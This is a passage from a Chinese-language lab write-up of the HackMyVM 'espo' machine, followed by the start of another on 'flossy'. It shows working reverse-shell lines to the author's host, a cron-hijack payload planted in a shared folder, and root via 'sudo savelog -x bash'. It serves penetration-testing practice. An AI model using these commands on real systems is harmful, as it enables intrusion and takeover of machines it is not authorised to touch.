shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n---\n\n# 4.\u63d0\u6743\n\n```bash\nwww-data@espo:~/html/public$ ls -la\ntotal 36\ndrwxr-xr-x  5 www-data www-data 4096 Jan  8 06:52 .\ndrwxr-xr-x 12 www-data www-data 4096 Dec  4  2023 ..\ndrwxr-xr-x  3 www-data www-data 4096 Dec  4  2023 api\n-rw-r--r--  1 www-data www-data 1689 Dec  4  2023 index.php\ndrwxr-xr-x  5 www-data www-data 4096 Dec  4  2023 install\n-rw-r--r--  1 www-data www-data 1660 Dec  4  2023 oauth-callback.php\ndrwxr-xr-x  2 www-data www-data 4096 Dec  4  2023 portal\n-rw-r--r--  1 www-data www-data   26 Dec  4  2023 robots.txt\n-rw-r--r--  1 www-data www-data  302 Jan  8 06:52 webshell.php\nwww-data@espo:~/html/public$ cd ..\nwww-data@espo:~/html$ ls -la\ntotal 136\ndrwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 .\ndrwxr-xr-x  4 root     root      4096 Dec  4  2023 ..\n-rw-r--r--  1 www-data www-data  1153 Dec  4  2023 .htaccess\ndrwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 EspoCRM-7.2.4\n-rw-r--r--  1 www-data www-data 35819 Dec  4  2023 LICENSE.txt\ndrwxr-xr-x  3 www-data www-data  4096 Dec  4  2023 application\ndrwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 bin\n-rw-r--r--  1 www-data www-data  1498 Dec  4  2023 bootstrap.php\n-rw-r--r--  1 www-data www-data  1543 Dec  4  2023 clear_cache.php\ndrwxr-xr-x 12 www-data www-data  4096 Dec  4  2023 client\n-rw-r--r--  1 www-data www-data  1536 Dec  4  2023 command.php\n-rw-r--r--  1 www-data www-data  1531 Dec  4  2023 cron.php\ndrwxrwxr-x  3 www-data www-data  4096 Dec  4  2023 custom\n-rw-r--r--  1 www-data www-data  1535 Dec  4  2023 daemon.php\ndrwxrwxr-x  7 www-data www-data  4096 Jan  8 06:52 data\n-rw-r--r--  1 www-data www-data  2812 Dec  4  2023 extension.php\ndrwxr-xr-x  2 www-data www-data  4096 Dec  4  2023 html\n-rw-r--r--  1 www-data www-data  3170 Dec  4  2023 index.php\ndrwxr-xr-x  4 www-data www-data  4096 Dec  4  2023 install\n-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 preload.php\ndrwxr-xr-x  5 www-data www-data  4096 Jan  8 06:52 public\n-rw-r--r--  1 www-data www-data  1537 Dec  4  2023 rebuild.php\n-rw-r--r--  1 www-data www-data  3034 Dec  4  2023 upgrade.php\ndrwxr-xr-x 39 www-data www-data  4096 Dec  4  2023 vendor\n-rw-r--r--  1 www-data www-data  2534 Dec  4  2023 web.config\n-rw-r--r--  1 www-data www-data  1541 Dec  4  2023 websocket.php\nwww-data@espo:~/html$ cd /home/\nwww-data@espo:/home$ ls -al\ntotal 12\ndrwxr-xr-x  3 root   root   4096 Jan 24  2024 .\ndrwxr-xr-x 18 root   root   4096 Dec  4  2023 ..\ndrwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 mandie\nwww-data@espo:/home$ cd mandie/\nwww-data@espo:/home/mandie$ ls -al\ntotal 48\ndrwxr-xr-x  6 mandie mandie 4096 Jan  8 06:55 .\ndrwxr-xr-x  3 root   root   4096 Jan 24  2024 ..\nlrwxrwxrwx  1 root   root      9 Jan 26  2024 .bash_history -> /dev/null\n-rw-r--r--  1 mandie mandie  220 Dec  4  2023 .bash_logout\n-rw-r--r--  1 mandie mandie 3526 Dec  4  2023 .bashrc\ndrwxr-xr-x  3 mandie mandie 4096 Dec  4  2023 .local\ndrwxr-xr-x 12 mandie mandie 4096 Dec  4  2023 .oh-my-zsh\n-rw-r--r--  1 mandie mandie  807 Dec  4  2023 .profile\n-rw-r--r--  1 mandie mandie 3890 Dec  4  2023 .zshrc\n-rwxr-xr--  1 mandie mandie  493 Dec  4  2023 copyPics\ndrwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 pictures\n-rwx------  1 mandie mandie   33 Jan 24  2024 user.txt\ndrwxr-xr-x  2 mandie mandie 4096 Jan  8 06:55 videos\nwww-data@espo:/home/mandie$ cd copyPics \nbash: cd: copyPics: Not a directory\nwww-data@espo:/home/mandie$ cat copyPics \n#!/bin/bash\n\nSOURCE_MEDIAS='/var/shared_medias'\nPICTURES_DIR='$HOME/pictures'\nVIDEOS_DIR='$HOME/videos'\n\n/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2>/dev/null \\;\nmkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'\n\ndeclare -A directory_mappings\ndirectory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )\n\nfor dir in '${!directory_mappings[@]}'; do\n    for ext in ${directory_mappings[$dir]}; do\n        mv '$HOME'/*.$ext '$dir/' 2>/dev/null\n    done\ndone\nwww-data@espo:/home/mandie$ cd /tmp/\nwww-data@espo:/tmp$ wget 192.168.205.141/pspy\n--2025-01-08 06:56:53--  http://192.168.205.141/pspy\nConnecting to 192.168.205.141:80... connected.\nHTTP request sent, awaiting response... 200 OK\nLength: 3518724 (3.4M) [application/octet-stream]\nSaving to: 'pspy'\n\npspy                                                         0%[                                                                       pspy                                                       100%[========================================================================================================================================>]   3.36M  --.-KB/s    in 0.02s   \n\n2025-01-08 06:56:53 (172 MB/s) - 'pspy' saved [3518724/3518724]\n\nwww-data@espo:/tmp$ chmod +x pspy \nwww-data@espo:/tmp$ ./pspy \npspy - version: 1.2.1 - Commit SHA: kali\n\n\n     \u2588\u2588\u2593\u2588\u2588\u2588    \u2588\u2588\u2588\u2588\u2588\u2588  \u2588\u2588\u2593\u2588\u2588\u2588 \u2593\u2588\u2588   \u2588\u2588\u2593\n    \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588    \u2592 \u2593\u2588\u2588\u2591  \u2588\u2588\u2592\u2592\u2588\u2588  \u2588\u2588\u2592\n    \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592\u2591 \u2593\u2588\u2588\u2584   \u2593\u2588\u2588\u2591 \u2588\u2588\u2593\u2592 \u2592\u2588\u2588 \u2588\u2588\u2591\n    \u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592  \u2592   \u2588\u2588\u2592\u2592\u2588\u2588\u2584\u2588\u2593\u2592 \u2592 \u2591 \u2590\u2588\u2588\u2593\u2591\n    \u2592\u2588\u2588\u2592 \u2591  \u2591\u2592\u2588\u2588\u2588\u2588\u2588\u2588\u2592\u2592\u2592\u2588\u2588\u2592 \u2591  \u2591 \u2591 \u2588\u2588\u2592\u2593\u2591\n    \u2592\u2593\u2592\u2591 \u2591  \u2591\u2592 \u2592\u2593\u2592 \u2592 \u2591\u2592\u2593\u2592\u2591 \u2591  \u2591  \u2588\u2588\u2592\u2592\u2592 \n    \u2591\u2592 \u2591     \u2591 \u2591\u2592  \u2591 \u2591\u2591\u2592 \u2591     \u2593\u2588\u2588 \u2591\u2592\u2591 \n    \u2591\u2591       \u2591  \u2591  \u2591  \u2591\u2591       \u2592 \u2592 \u2591\u2591  \n                   \u2591           \u2591 \u2591   \n                               \u2591 \u2591   \n\nConfig: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)\nDraining file system events due to startup...\ndone\n2025/01/08 06:57:08 CMD: UID=33    PID=2064   | ./pspy \n2025/01/08 06:57:08 CMD: UID=0     PID=2048   | /usr/bin/php -f cron.php \n2025/01/08 06:57:08 CMD: UID=0     PID=2047   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php > /dev/null 2>&1 \n2025/01/08 06:57:08 CMD: UID=0     PID=2044   | /usr/sbin/CRON -f \n2025/01/08 06:57:08 CMD: UID=33    PID=2015   | bash \n2025/01/08 06:57:08 CMD: UID=33    PID=2014   | sh -c bash \n2025/01/08 06:57:08 CMD: UID=33    PID=2013   | script /dev/null -c bash \n2025/01/08 06:57:08 CMD: UID=0     PID=2011   | \n2025/01/08 06:57:08 CMD: UID=33    PID=1990   | bash -i \n2025/01/08 06:57:08 CMD: UID=33    PID=1989   | bash -c bash -i >& /dev/tcp/192.168.205.141/8888 0>&1 \n2025/01/08 06:57:08 CMD: UID=33    PID=1988   | sh -c bash -c 'bash -i >& /dev/tcp/192.168.205.141/8888 0>&1' \n2025/01/08 06:57:08 CMD: UID=0     PID=1935   | \n2025/01/08 06:57:08 CMD: UID=0     PID=1873   | \n2025/01/08 06:57:08 CMD: UID=0     PID=1808   | \n2025/01/08 06:57:08 CMD: UID=0     PID=1595   | \n2025/01/08 06:57:08 CMD: UID=0     PID=1273   | \n2025/01/08 06:57:08 CMD: UID=33    PID=1111   | php-fpm: pool www                                                           \n2025/01/08 06:57:08 CMD: UID=109   PID=1042   | qmgr -l -t unix -u \n2025/01/08 06:57:08 CMD: UID=109   PID=1041   | pickup -l -t unix -u -c \n2025/01/08 06:57:08 CMD: UID=0     PID=1039   | /usr/lib/postfix/sbin/master -w \n2025/01/08 06:57:08 CMD: UID=108   PID=673    | /usr/sbin/mariadbd \n2025/01/08 06:57:08 CMD: UID=0     PID=629    | sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups \n2025/01/08 06:57:08 CMD: UID=33    PID=609    | php-fpm: pool www                                                           \n2025/01/08 06:57:08 CMD: UID=33    PID=608    | php-fpm: pool www                                                           \n2025/01/08 06:57:08 CMD: UID=33    PID=544    | nginx: worker process                          \n2025/01/08 06:57:08 CMD: UID=0     PID=540    | nginx: master process /usr/sbin/nginx -g daemon on; master_process on; \n2025/01/08 06:57:08 CMD: UID=0     PID=531    | /sbin/agetty -o -p -- \\u --noclear - linux \n2025/01/08 06:57:08 CMD: UID=0     PID=509    | php-fpm: master process (/etc/php/8.2/fpm/php-fpm.conf)                     \n2025/01/08 06:57:08 CMD: UID=0     PID=489    | /usr/sbin/ModemManager \n2025/01/08 06:57:08 CMD: UID=0     PID=461    | /sbin/wpa_supplicant -u -s -O DIR=/run/wpa_supplicant GROUP=netdev \n2025/01/08 06:57:08 CMD: UID=0     PID=432    | \n2025/01/08 06:57:08 CMD: UID=0     PID=421    | /lib/systemd/systemd-logind \n2025/01/08 06:57:08 CMD: UID=996   PID=414    | /usr/lib/polkit-1/polkitd --no-debug \n2025/01/08 06:57:08 CMD: UID=100   PID=411    | /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopidfile --systemd-activation --syslog-only                                                                                                                    \n2025/01/08 06:57:08 CMD: UID=0     PID=410    | /usr/sbin/cron -f \n2025/01/08 06:57:08 CMD: UID=0     PID=389    | dhclient -4 -v -i -pf /run/dhclient.enp0s3.pid -lf /var/lib/dhcp/dhclient.enp0s3.leases -I -df /var/lib/dhcp/dhclient6.enp0s3.leases enp0s3                                                                                 \n2025/01/08 06:57:08 CMD: UID=0     PID=303    | \n2025/01/08 06:57:08 CMD: UID=997   PID=284    | /lib/systemd/systemd-timesyncd \n2025/01/08 06:57:08 CMD: UID=0     PID=242    | /lib/systemd/systemd-udevd \n2025/01/08 06:57:08 CMD: UID=0     PID=218    | /lib/systemd/systemd-journald \n2025/01/08 06:57:08 CMD: UID=0     PID=174    | \n2025/01/08 06:57:08 CMD: UID=0     PID=173    | \n2025/01/08 06:57:08 CMD: UID=0     PID=141    | \n2025/01/08 06:57:08 CMD: UID=0     PID=134    | \n2025/01/08 06:57:08 CMD: UID=0     PID=133    | \n2025/01/08 06:57:08 CMD: UID=0     PID=132    | \n2025/01/08 06:57:08 CMD: UID=0     PID=131    | \n2025/01/08 06:57:08 CMD: UID=0     PID=130    | \n2025/01/08 06:57:08 CMD: UID=0     PID=129    | \n2025/01/08 06:57:08 CMD: UID=0     PID=126    | \n2025/01/08 06:57:08 CMD: UID=0     PID=59     | \n2025/01/08 06:57:08 CMD: UID=0     PID=58     | \n2025/01/08 06:57:08 CMD: UID=0     PID=53     | \n2025/01/08 06:57:08 CMD: UID=0     PID=48     | \n2025/01/08 06:57:08 CMD: UID=0     PID=47     | \n2025/01/08 06:57:08 CMD: UID=0     PID=46     | \n2025/01/08 06:57:08 CMD: UID=0     PID=44     | \n2025/01/08 06:57:08 CMD: UID=0     PID=38     | \n2025/01/08 06:57:08 CMD: UID=0     PID=37     | \n2025/01/08 06:57:08 CMD: UID=0     PID=36     | \n2025/01/08 06:57:08 CMD: UID=0     PID=35     | \n2025/01/08 06:57:08 CMD: UID=0     PID=34     | \n2025/01/08 06:57:08 CMD: UID=0     PID=33     | \n2025/01/08 06:57:08 CMD: UID=0     PID=32     | \n2025/01/08 06:57:08 CMD: UID=0     PID=31     | \n2025/01/08 06:57:08 CMD: UID=0     PID=30     | \n2025/01/08 06:57:08 CMD: UID=0     PID=29     | \n2025/01/08 06:57:08 CMD: UID=0     PID=28     | \n2025/01/08 06:57:08 CMD: UID=0     PID=27     | \n2025/01/08 06:57:08 CMD: UID=0     PID=24     | \n2025/01/08 06:57:08 CMD: UID=0     PID=23     | \n2025/01/08 06:57:08 CMD: UID=0     PID=22     | \n2025/01/08 06:57:08 CMD: UID=0     PID=21     | \n2025/01/08 06:57:08 CMD: UID=0     PID=20     | \n2025/01/08 06:57:08 CMD: UID=0     PID=18     | \n2025/01/08 06:57:08 CMD: UID=0     PID=16     | \n2025/01/08 06:57:08 CMD: UID=0     PID=15     | \n2025/01/08 06:57:08 CMD: UID=0     PID=14     | \n2025/01/08 06:57:08 CMD: UID=0     PID=13     | \n2025/01/08 06:57:08 CMD: UID=0     PID=12     | \n2025/01/08 06:57:08 CMD: UID=0     PID=11     | \n2025/01/08 06:57:08 CMD: UID=0     PID=10     | \n2025/01/08 06:57:08 CMD: UID=0     PID=6      | \n2025/01/08 06:57:08 CMD: UID=0     PID=5      | \n2025/01/08 06:57:08 CMD: UID=0     PID=4      | \n2025/01/08 06:57:08 CMD: UID=0     PID=3      | \n2025/01/08 06:57:08 CMD: UID=0     PID=2      | \n2025/01/08 06:57:08 CMD: UID=0     PID=1      | /sbin/init \n2025/01/08 06:58:01 CMD: UID=0     PID=2072   | /usr/sbin/CRON -f \n2025/01/08 06:58:01 CMD: UID=0     PID=2071   | /usr/sbin/cron -f \n2025/01/08 06:58:01 CMD: UID=0     PID=2073   | /usr/sbin/CRON -f \n2025/01/08 06:58:01 CMD: UID=0     PID=2075   | /usr/sbin/CRON -f \n2025/01/08 06:58:01 CMD: UID=0     PID=2077   | /bin/sh -c cd /var/www/html; /usr/bin/php -f cron.php > /dev/null 2>&1 \n2025/01/08 06:58:01 CMD: UID=1000  PID=2076   | /bin/sh -c /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2078   | /bin/bash /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2079   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2080   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2081   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2082   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2083   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2084   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2085   | /usr/bin/find /var/shared_medias ! -executable -exec /usr/bin/cp {} /home/mandie ; \n2025/01/08 06:58:01 CMD: UID=1000  PID=2086   | /bin/bash /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2087   | /bin/bash /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2088   | /bin/bash /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2089   | /bin/bash /home/mandie/copyPics \n2025/01/08 06:58:01 CMD: UID=1000  PID=2090   | /bin/bash /home/mandie/copyPics \n^CExiting program... (interrupt)\n\n```\n\n\u6709\u5b9a\u65f6\u4efb\u52a1\u7528`UID1000`\u7684\u7528\u6237\u6267\u884c`/home/mandie/copyPics`\uff0c`copyPics`\u7684\u5185\u5bb9\n\n```bash\nwww-data@espo:/home/mandie$ cat copyPics \n#!/bin/bash\n\nSOURCE_MEDIAS='/var/shared_medias'\nPICTURES_DIR='$HOME/pictures'\nVIDEOS_DIR='$HOME/videos'\n\n/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2>/dev/null \\;\nmkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'\n\ndeclare -A directory_mappings\ndirectory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )\n\nfor dir in '${!directory_mappings[@]}'; do\n    for ext in ${directory_mappings[$dir]}; do\n        mv '$HOME'/*.$ext '$dir/' 2>/dev/null\n    done\ndone\n```\n\n\u5b9e\u73b0\u4e86\u4ece\u4e00\u4e2a\u76ee\u5f55 `/var/shared_medias` \u4e2d\u7b5b\u9009\u4e0d\u53ef\u6267\u884c\u6587\u4ef6\uff0c\u5e76\u628a\u6587\u4ef6\u590d\u5236\u5230\u7528\u6237\u7684\u5bb6\u76ee\u5f55\u4e0b\u3002\u90a3\u6211\u4eec\u53ef\u4ee5\u5c1d\u8bd5\u5728`/var/shared_medias`\u4e2d\u521b\u5efa\u4e00\u4e2a`copyPics`\u6587\u4ef6\uff0c\u5e76\u5728\u91cc\u9762\u52a0\u70b9\u6599\n\n```bash\nwww-data@espo:/tmp$ ls -la /var/shared_medias\ntotal 7792\ndrwxrwxrwt  2 root root    4096 Jan 24  2024 .\ndrwxr-xr-x 13 root root    4096 Dec  7  2023 ..\n-rw-r--r--  1 root root   61521 Dec  4  2023 bedroom.jpg\n-rw-r--r--  1 root root  298808 Dec  4  2023 burger.jpeg\n-rw-r--r--  1 root root  236712 Dec  4  2023 dad-baby.jpg\n-rw-r--r--  1 root root   61324 Dec  4  2023 dorothy.jpeg\n-rw-r--r--  1 root root  268188 Dec  4  2023 family.jpg\n-rw-r--r--  1 root root  251902 Dec  4  2023 maldives.jpg\n-rw-r--r--  1 root root 6779935 Dec  4  2023 sky.mp4\nwww-data@espo:/tmp$ cd /var/shared_medias\nwww-data@espo:/var/shared_medias$ cp /home/mandie/copyPics .\nwww-data@espo:/var/shared_medias$ nano copyPics \nwww-data@espo:/var/shared_medias$ cat copyPics \n#!/bin/bash\n\nSOURCE_MEDIAS='/var/shared_medias'\nPICTURES_DIR='$HOME/pictures'\nVIDEOS_DIR='$HOME/videos'\n\n/usr/bin/find '$SOURCE_MEDIAS' ! -executable -exec /usr/bin/cp {} '$HOME' 2>/dev/null \\;\nmkdir -p '$PICTURES_DIR' '$VIDEOS_DIR'\n\ndeclare -A directory_mappings\ndirectory_mappings=( ['$PICTURES_DIR']='jpeg jpg' ['$VIDEOS_DIR']='mp4 avi' )\n\nfor dir in '${!directory_mappings[@]}'; do\n    for ext in ${directory_mappings[$dir]}; do\n        mv '$HOME'/*.$ext '$dir/' 2>/dev/null\n    done\ndone\n\n\nbash -c 'bash -i >& /dev/tcp/192.168.205.141/9999 0>&1'\n```\n\n\u8ba9\u5b50\u5f39\u98de\u4f1a\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nc -lvnp 9999\nlistening on [any] 9999 ...\nid\nconnect to [192.168.205.141] from (UNKNOWN) [192.168.205.236] 43262\nbash: cannot set terminal process group (2562): Inappropriate ioctl for device\nbash: no job control in this shell\nmandie@espo:~$ id\nuid=1000(mandie) gid=1000(mandie) groups=1000(mandie),100(users)\n\n```\n\n\u83b7\u5f97\u4e00\u4e0b\u7a33\u5b9a\u7684**\u4ea4\u4e92\u5f0f** **TTY shell**\uff1a\n\n```bash\nscript /dev/null -c bash  \nctrl+z  \nstty raw -echo; fg  \nreset xterm  \nexport TERM=xterm  \necho $SHELL  \nexport SHELL=/bin/bash  \nstty rows 59 cols 236\n```\n\n\u5c1d\u8bd5\u63d0\u6743\n\n```bash\nmandie@espo:~$ sudo -l\nsudo: unable to resolve host espo: Name or service not known\nMatching Defaults entries for mandie on espo:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin, use_pty\n\nUser mandie may run the following commands on espo:\n    (ALL : ALL) NOPASSWD: /usr/bin/savelog\nmandie@espo:~$ /usr/bin/savelog -h\nUsage: savelog [-m mode] [-u user] [-g group] [-t] [-c cycle] [-p]\n             [-j] [-C] [-d] [-l] [-r rolldir] [-n] [-q] file ...\n        -m mode    - chmod log files to mode\n        -u user    - chown log files to user\n        -g group   - chgrp log files to group\n        -c cycle   - save cycle versions of the logfile (default: 7)\n        -r rolldir - use rolldir instead of . to roll files\n        -C         - force cleanup of cycled logfiles\n        -d         - use standard date for rolling\n        -D         - override date format for -d\n        -t         - touch file\n        -l         - don't compress any log files (default: compress)\n        -p         - preserve mode/user/group of original file\n        -j         - use bzip2 instead of gzip\n        -J         - use xz instead of gzip\n        -1 .. -9   - compression strength or memory usage (default: 9, except for xz)\n        -x script  - invoke script with rotated log file in $FILE\n        -n         - do not rotate empty files\n        -q         - suppress rotation message\n        file       - log file names\n\n# \u7ffb\u8bd1\n\u7528\u6cd5\uff1a savelog [-m \u6a21\u5f0f] [-u \u7528\u6237] [-g \u7ec4] [-t] [-c \u5faa\u73af] [-p]\n             [-j][-C][-d][-l][-r \u6eda\u52a8\u76ee\u5f55][-n][-q] \u6587\u4ef6 ...\n        -m mode - chmod \u65e5\u5fd7\u6587\u4ef6\u6a21\u5f0f\n        -u \u7528\u6237 - \u5c06\u65e5\u5fd7\u6587\u4ef6\u4e0a\u4f20\u5230\u7528\u6237\n        -g group - \u8981\u5206\u7ec4\u7684 chgrp \u65e5\u5fd7\u6587\u4ef6\n        -c cycle - \u4fdd\u5b58\u65e5\u5fd7\u6587\u4ef6\u7684\u5faa\u73af\u7248\u672c\uff08\u9ed8\u8ba4\u503c\uff1a7\uff09\n        -r rolldir - \u4f7f\u7528 rolldir \u800c\u4e0d\u662f .\u6eda\u52a8\u6587\u4ef6\n        -C - \u5f3a\u5236\u6e05\u7406\u5faa\u73af\u7684\u65e5\u5fd7\u6587\u4ef6\n        -d - \u4f7f\u7528\u6807\u51c6\u65e5\u671f\u8fdb\u884c\u6eda\u52a8\n        -D - \u8986\u76d6 -d \u7684\u65e5\u671f\u683c\u5f0f\n        -t - \u89e6\u6478\u6587\u4ef6\n        -l - \u4e0d\u538b\u7f29\u4efb\u4f55\u65e5\u5fd7\u6587\u4ef6\uff08\u9ed8\u8ba4\uff1acompress\uff09\n        -p - \u4fdd\u7559\u539f\u59cb\u6587\u4ef6\u7684\u6a21\u5f0f/\u7528\u6237/\u7ec4\n        -j - \u4f7f\u7528 bzip2 \u800c\u4e0d\u662f gzip\n        -J - \u4f7f\u7528 xz \u800c\u4e0d\u662f gzip\n        -1 ..-9 - \u538b\u7f29\u5f3a\u5ea6\u6216\u5185\u5b58\u4f7f\u7528\u7387\uff08\u9ed8\u8ba4\u503c\uff1a9\uff0cxz \u9664\u5916\uff09\n        -x script - \u4f7f\u7528$FILE\u4e2d\u65cb\u8f6c\u7684\u65e5\u5fd7\u6587\u4ef6\u8c03\u7528\u811a\u672c\n        -n - \u4e0d\u65cb\u8f6c\u7a7a\u6587\u4ef6\n        -q - \u7981\u6b62\u65cb\u8f6c\u6d88\u606f\n        file - \u65e5\u5fd7\u6587\u4ef6\u540d\n\n```\n\n`-x`\u6211\u4eec\u6bd4\u8f83\u611f\u5174\u8da3\uff0c\u8bd5\u8bd5\u884c\u4e0d\u884c\n\n```bash\nmandie@espo:~$ find / -name '*.log' 2>/dev/null\n/var/www/html/data/logs/espo-2023-12-04.log\n/var/www/html/data/logs/espo-2025-01-08.log\n/var/www/html/data/logs/espo-2024-01-24.log\n/var/log/alternatives.log\n/var/log/nginx/access.log\n/var/log/nginx/error.log\n/var/log/dpkg.log\n/var/log/php8.2-fpm.log\n/var/lib/mysql/ddl_recovery-backup.log\n/var/lib/mysql/ddl_recovery.log\nmandie@espo:~$ sudo /usr/bin/savelog -x bash /var/log/nginx/access.log\nsudo: unable to resolve host espo: Name or service not known\nroot@espo:/home/mandie# id\nuid=0(root) gid=0(root) groups=0(root)\n```\n\n\u6210\u529f\u63d0\u6743\n\n# 5.\u540e\u8bdd\n\n\u770b\u4e86\u4e00\u4e0b`HGBE`\u5927\u4f6c\u7684wp\uff0c\u624d\u53d1\u73b0\u7fa4\u4e3b`ll104567`\u53d1\u73b0\u4e86\u4e00\u4e2a\u5b9a\u65f6\u4efb\u52a1\u76f4\u63a5\u83b7\u53d6 root\n\n![image](https://github.com/user-attachments/assets/09639c30-986e-458a-89e8-7010827f3d1d)\n\n\u751a\u81f3\u5728`www-data`\u6743\u9650\u7684\u65f6\u5019\u5c31\u53ef\u4ee5\u76f4\u63a5\u63d0\u6743\u5230`root`\n![C4](https://github.com/user-attachments/assets/b1b76fe8-1a83-43f9-8ff3-ae2dc30f8a95)sentence", "top": 0, "createdAt": 1751016785, "style": "", "script": "</script><script src='https://7r1UMPHK.github.io/plugins/TOC.js'></script><script src='https://7r1UMPHK.github.io/plugins/lightbox.js'></script><script src='https://7r1UMPHK.github.io/plugins/LazyLoadImages.js'></script>", "head": "", "ogImage": "https://7r1umphk.github.io/image/20250716100121947.webp", "createdDate": "2025-06-27", "dateLabelColor": "#0969da"}, "P102": {"htmlDir": "docs/post/hmv_flossy.html", "labels": ["HackMyVM"], "postTitle": "hmv_flossy", "postUrl": "post/hmv_flossy.html", "postSourceUrl": "https://github.com/7r1UMPHK/7r1UMPHK.github.io/issues/102", "commentNum": 0, "wordCount": 18223, "description": "# hmv_flossy\n\n# 0.\u7b80\u4ecb\n\n**\u9776\u673a**\uff1a[hackmyvm - flossy](https://hackmyvm.eu/machines/machine.php?vm=flossy)\n**\u96be\u5ea6**\uff1a\u9ec4\u8272\n**\u76ee\u6807 IP**\uff1a192.168.205.138\n**\u672c\u673a IP**\uff1a192.168.205.141\n\n# 1.\u626b\u63cf\n\n`nmap`\u8d77\u624b\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nmap -sS --min-rate 10000 -p- -Pn 192.168.205.138\nStarting Nmap 7.95 ( https://nmap.org ) at 2025-01-17 16:18 CST\nNmap scan report for 192.168.205.138\nHost is up (0.00026s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE\n22/tcp open  ssh\n80/tcp open  http\nMAC Address: 08:00:27:61:56:42 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)\n\nNmap done: 1 IP address (1 host up) scanned in 1.43 seconds\n\n```\n\n\u5148\u770b**80\u7aef\u53e3**\uff0c**22\u7aef\u53e3**\u5019\u8865\n\n# 2.\u8e29\u70b9\n\n![Image](https://github.com/user-attachments/assets/b9a4753b-3614-43d8-adff-220881ce04cd)\n\n\u4e00\u4e2a\u67e5\u8be2\u9875\u9762\uff0c\u53ef\u4ee5\u8f93\u5165\u6570\u503c\u8fdb\u884c\u67e5\u8be2\uff0c\u6709\u6548\u8303\u56f4\u662f**1-99**\uff0c\u540e\u9762\u7684\u6570\u636e\u662f\u91cd\u590d\u7684\u3002\u5c1d\u8bd5sql\u6ce8\u5165\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ sqlmap -u 'http://192.168.205.138' --forms --batch \n        ___\n       __H__                                                                                                                         \n ___ ___[.]_____ ___ ___  {1.9#stable}                                                                                                 \n|_ -| . [)]     | .'| . |                                                                                                            \n|___|_  [.]_|_|_|__,|  _|                                                                                                            \n      |_|V...       |_|   https://sqlmap.org                                                                                         \n\n[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program\n\n[*] starting @ 16:44:38 /2025-01-17/\n\n[16:44:38] [INFO] testing connection to the target URL\n[16:44:38] [INFO] searching for forms\n[16:44:38] [CRITICAL] there were no forms found at the given target URL\n\n[*] ending @ 16:44:38 /2025-01-17/\n\n```\n\n\u4e0d\u884c\uff0c\u5c1d\u8bd5\u7279\u6b8a\u7b26\u53f7\u7ed5\u8fc7\uff0c\u65e0\u679c\u3002\u626b\u63cf\u67b6\u6784\n\n```bash\n\u250c\u2500\u2500(kali\u327fkali)-[~/test]\n\u2514\u2500$ nuclei -u http://192.168.205.138               \n\n                     __     _\n   ____  __  _______/ /__  (_)\n  / __ \\/ / / / ___/ / _ \\/ /\n / / / / /_/ / /__/ /  __/ /\n/_/ /_/\\__,_/\\___/_/\\___/_/   v3.3.8\n\n                projectdiscovery.io\n\n[INF] Current nuclei version: v3.3.8 (latest)\n[INF] Current nuclei-templates version: v10.1.1 (latest)\n[WRN] Scan results upload to cloud is disabled.\n[INF] New templates added in latest release: 154\n[INF] Templates loaded for current scan: 7607\n[WRN] Loading 182 unsigned templates for scan. Use with caution.\n[INF] Executing 7425 signed templates from 